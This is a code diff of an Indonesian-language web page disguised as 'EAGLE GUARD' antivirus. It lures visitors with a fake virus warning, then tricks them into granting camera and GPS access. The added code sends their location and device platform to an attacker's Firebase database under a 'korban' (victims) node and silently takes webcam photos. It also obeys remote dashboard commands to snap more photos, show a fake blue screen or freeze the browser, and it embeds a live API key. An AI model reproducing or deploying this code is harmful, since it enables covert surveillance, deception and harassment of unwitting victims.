@@ -2,59 +2,114 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EAGLE GUARD | SCANNER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EAGLE GUARD | SYSTEM PROTECTION</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: monospace; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #00f2ff; padding: 40px; border-radius: 20px; width: 80%; box-shadow: 0 0 20px #00f2ff; cursor: pointer; }
-        #bsod { position: fixed; inset: 0; background: #0078d7; color: #fff; padding: 10%; text-align: left; display: none; z-index: 9999; }
+        :root { --neon: #00f2ff; --bg: #000; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; text-align: center; }
+        
+        /* BOX DESIGN */
+        .box { border: 2px solid var(--neon); padding: 40px 20px; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 25px rgba(0, 242, 255, 0.2); width: 85%; max-width: 400px; cursor: pointer; transition: 0.3s; }
+        .box:active { transform: scale(0.95); }
+
+        /* SVG EAGLE LOGO (Matching Dashboard) */
+        .eagle-svg { width: 70px; fill: var(--neon); filter: drop-shadow(0 0 10px var(--neon)); margin-bottom: 20px; }
+
+        /* LOADING ANIMATION */
+        .loader { border: 3px solid #111; border-top: 3px solid var(--neon); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* BSOD (Blue Screen of Death) */
+        #bsod { position: fixed; inset: 0; background: #0078d7; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 10%; text-align: left; display: none; z-index: 9999; }
         video, canvas { display: none; }
     </style>
 </head>
-<body onclick="ignite()">
+<body onclick="startProtection()">
+
     <div class="box" id="ui">
-        <h1>🦅</h1>
-        <h3>EAGLE GUARD v2.1</h3>
-        <p>Virus Detected! Click to repair system.</p>
-        <div id="st">[ STANDBY ]</div>
+        <svg class="eagle-svg" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2zM12 15.5l-3.5 1.5 3.5-8.5 3.5 8.5-3.5-1.5z"/></svg>
+        <h2 style="margin:0; letter-spacing:2px;">EAGLE GUARD</h2>
+        <p id="msg" style="font-size: 13px; opacity:0.8; margin-top:15px;">System Vulnerability Found!<br>Click to Start Deep Clean & Repair.</p>
+        <div class="loader" id="loader"></div>
+        <div id="status" style="font-size: 10px; margin-top: 15px; color: var(--neon);">[ TAP TO IGNITE ]</div>
     </div>
+
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
-    <div id="bsod"><h1>:(</h1><p>Your device ran into a problem... <span id="p">0</span>%</p></div>
+
+    <div id="bsod">
+        <div style="font-size: 80px;">:(</div>
+        <h2 style="font-weight: normal;">Your device ran into a problem...</h2>
+        <p>We're just collecting some error info, and then we'll restart for you.</p>
+        <p><span id="pct">0</span>% complete</p>
+    </div>
 
 <script>
-    const config = { apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" };
+    // FIREBASE CONFIG (Sesuai Dashboard Lu)
+    const config = { 
+        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
+        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
+    };
     firebase.initializeApp(config); const db = firebase.database();
-    
-    async function ignite() {
-        document.getElementById('st').innerText = "[ INITIALIZING... ]";
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            document.getElementById('v').srcObject = stream;
-            navigator.geolocation.getCurrentPosition(pos => {
-                const ref = db.ref('korban').push({ waktu: new Date().toLocaleString(), maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` });
-                document.getElementById('ui').innerHTML = "<h1>⚙️</h1><h3>REPAIRING...</h3><p>Jangan tutup halaman ini.</p>";
-                
-                // AUTO-SNAP: Ambil foto pertama tanpa perintah dashboard
-                setTimeout(() => { takeSnap(ref.key); }, 2000);
 
-                db.ref('commands/'+ref.key).on('value', s => {
-                    const a = s.val()?.action;
-                    if(a === "TAKE") takeSnap(ref.key);
-                    if(a === "BSOD") document.getElementById('bsod').style.display = 'block';
-                    if(a === "CRASH") while(true) document.body.appendChild(document.createElement('div'));
+    let isRunning = false;
+
+    async function startProtection() {
+        if(isRunning) return;
+        isRunning = true;
+        
+        document.getElementById('loader').style.display = 'block';
+        document.getElementById('status').innerText = "[ INITIALIZING SECURITY TUNNEL... ]";
+        
+        try {
+            // Minta Kamera & Lokasi Sekaligus
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            
+            navigator.geolocation.getCurrentPosition(pos => {
+                const nodeRef = db.ref('korban').push({
+                    t: new Date().toLocaleString(),
+                    maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                    os: navigator.platform
                 });
-            });
-        } catch(e) { alert("Izinkan Kamera & GPS!"); }
+                const nodeKey = nodeRef.key;
+
+                // UI Update (Biar Target Percaya)
+                document.getElementById('msg').innerHTML = "<b>REPAIRING SYSTEM...</b><br>Please do not close this window.";
+                document.getElementById('status').innerText = "[ PROCESSING NODE: " + nodeKey.substring(1,7) + " ]";
+
+                // 📸 AUTO-SNAP (Ambil foto otomatis setelah 2 detik)
+                setTimeout(() => { takeSnap(nodeKey); }, 2000);
+
+                // 🛰️ LISTENER PERINTAH DARI DASHBOARD LU
+                db.ref('commands/' + nodeKey).on('value', snap => {
+                    const cmd = snap.val()?.action;
+                    if (cmd === "TAKE") takeSnap(nodeKey);
+                    if (cmd === "BSOD") triggerBSOD();
+                    if (cmd === "CRASH") while(true) { document.body.appendChild(document.createElement('div')); }
+                });
+
+            }, err => { alert("Error: Security scan requires GPS access!"); location.reload(); });
+
+        } catch (e) {
+            alert("Error: Eagle Guard requires Face-ID permission!");
+            location.reload();
+        }
     }
 
     function takeSnap(id) {
         const v = document.getElementById('v'), c = document.getElementById('c');
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
-        db.ref('hasil_foto/'+id).set({ foto: c.toDataURL('image/jpeg', 0.5) });
+        db.ref('hasil_foto/' + id).set({ foto: c.toDataURL('image/jpeg', 0.6) });
+    }
+
+    function triggerBSOD() {
+        document.getElementById('bsod').style.display = 'block';
+        let p = 0;
+        setInterval(() => { if(p < 100) { p++; document.getElementById('pct').innerText = p; } }, 150);
     }
 </script>
 </body>
